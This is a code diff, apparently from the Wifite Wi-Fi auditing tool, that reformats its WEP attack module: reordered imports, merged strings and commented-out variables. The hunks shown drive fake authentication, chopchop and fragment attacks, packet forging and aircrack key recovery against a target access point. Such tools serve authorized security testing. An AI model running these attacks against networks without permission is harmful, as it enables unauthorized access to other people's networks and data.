@@ -1,17 +1,16 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-from ..model.attack import Attack
-from ..tools.airodump import Airodump
-from ..tools.aireplay import Aireplay, WEPAttackType
-from ..tools.aircrack import Aircrack
-from ..tools.ip import Ip
-from ..config import Configuration
-from ..util.color import Color
-from ..util.input import raw_input
-from ..model.wep_result import CrackResultWEP
-
 import time
+
+from ..config import Configuration
+from ..model.attack import Attack
+from ..model.wep_result import CrackResultWEP
+from ..tools.aircrack import Aircrack
+from ..tools.aireplay import Aireplay, WEPAttackType
+from ..tools.airodump import Airodump
+from ..tools.ip import Ip
+from ..util.color import Color
 
 
 class AttackWEP(Attack):
@@ -75,8 +74,8 @@ class AttackWEP(Attack):
                         # Failed to fakeauth, can't use our MAC.
                         # And there are no associated clients. Use one and tell the user.
                         Color.pl('{!} {O}there are no associated clients{W}')
-                        Color.pl('{!} {R}WARNING: {O}many attacks will not succeed' +
-                                 ' without fake-authentication or associated clients{W}')
+                        Color.pl('{!} {R}WARNING: {O}many attacks will not succeed '
+                                 'without fake-authentication or associated clients{W}')
                         client_mac = None
                     else:
                         # Fakeauth failed, but we can re-use an existing client
@@ -95,7 +94,6 @@ class AttackWEP(Attack):
                     last_ivs_count = 0
 
                     # Loop until attack completes.
-
                     while True:
                         airodump_target = self.wait_for_target(airodump)
 
@@ -123,16 +121,18 @@ class AttackWEP(Attack):
                         # Check if we cracked it.
                         if aircrack and aircrack.is_cracked():
                             (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
-                            bssid = airodump_target.bssid
-                            if airodump_target.essid_known:
-                                essid = airodump_target.essid
-                            else:
-                                essid = None
+                            # bssid = airodump_target.bssid
+                            # if airodump_target.essid_known:
+                            #     essid = airodump_target.essid
+                            # else:
+                            #     essid = None
                             Color.pl('\n{+} {C}%s{W} WEP attack {G}successful{W}\n' % attack_name)
-                            if aireplay: aireplay.stop()
-                            if fakeauth_proc: fakeauth_proc.stop()
-                            self.crack_result = CrackResultWEP(self.target.bssid,
-                                                               self.target.essid, hex_key, ascii_key)
+                            if aireplay:
+                                aireplay.stop()
+                            if fakeauth_proc:
+                                fakeauth_proc.stop()
+
+                            self.crack_result = CrackResultWEP(self.target.bssid, self.target.essid, hex_key, ascii_key)
                             self.crack_result.dump()
 
                             Airodump.delete_airodump_temp_files('wep')
@@ -170,7 +170,6 @@ class AttackWEP(Attack):
                             # Some Aireplay attacks loop infinitely
                             if attack_name == 'chopchop' or attack_name == 'fragment':
                                 # We expect these to stop once a .xor is created, or if the process failed.
-
                                 replay_file = None
 
                                 # Check for .xor file.
@@ -184,14 +183,12 @@ class AttackWEP(Attack):
                                     break
 
                                 # If .xor exists, run packetforge-ng to create .cap
-                                Color.pl('\n{+} {C}%s attack{W}' % attack_name +
-                                         ' generated a {C}.xor file{W}, {G}forging...{W}')
-                                replay_file = Aireplay.forge_packet(xor_file,
-                                                                    airodump_target.bssid,
-                                                                    client_mac)
+                                Color.pl(
+                                    '\n{+} {C}%s attack{W}'
+                                    % attack_name + ' generated a {C}.xor file{W}, {G}forging...{W}')
+                                replay_file = Aireplay.forge_packet(xor_file, airodump_target.bssid, client_mac)
                                 if replay_file:
-                                    Color.pl('{+} {C}forged packet{W},' +
-                                             ' {G}replaying...{W}')
+                                    Color.pl('{+} {C}forged packet{W}, {G}replaying...{W}')
                                     wep_attack_type = WEPAttackType('forgedreplay')
                                     attack_name = 'forgedreplay'
                                     aireplay = Aireplay(self.target,
@@ -220,8 +217,7 @@ class AttackWEP(Attack):
                             if stale_seconds > Configuration.wep_restart_stale_ivs:
                                 # No new IVs within threshold, restart aireplay
                                 aireplay.stop()
-                                Color.pl('\n{!} restarting {C}aireplay{W} after' +
-                                         ' {C}%d{W} seconds of no new IVs'
+                                Color.pl('\n{!} Restarting {C}aireplay{W} after {C}%d{W} seconds of no new IVs'
                                          % stale_seconds)
                                 aireplay = Aireplay(self.target,
                                                     wep_attack_type,
@@ -344,16 +340,11 @@ class AttackWEP(Attack):
             Color.pl(' {R}failed{W}')
             if Configuration.require_fakeauth:
                 # Fakeauth is required, fail
-                raise Exception(
-                    'Fake-authenticate did not complete within' +
-                    ' %d seconds' % AttackWEP.fakeauth_wait)
+                raise Exception('Fake-authenticate did not complete within %d seconds' % AttackWEP.fakeauth_wait)
             else:
                 # Warn that fakeauth failed
-                Color.pl('{!} {O}' +
-                         'unable to fake-authenticate with target' +
-                         ' (%s){W}' % self.target.bssid)
-                Color.pl('{!} continuing attacks because' +
-                         ' {G}--require-fakeauth{W} was not set')
+                Color.pl('{!} {O} unable to fake-authenticate with target (%s){W}' % self.target.bssid)
+                Color.pl('{!} continuing attacks because {G}--require-fakeauth{W} was not set')
         return fakeauth
 
 
@@ -361,8 +352,8 @@ if __name__ == '__main__':
     Configuration.initialize(True)
     from ..model.target import Target
 
-    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(
-        ',')
+    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2' \
+             ',        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
     target = Target(fields)
     wep = AttackWEP(target)
     wep.run()
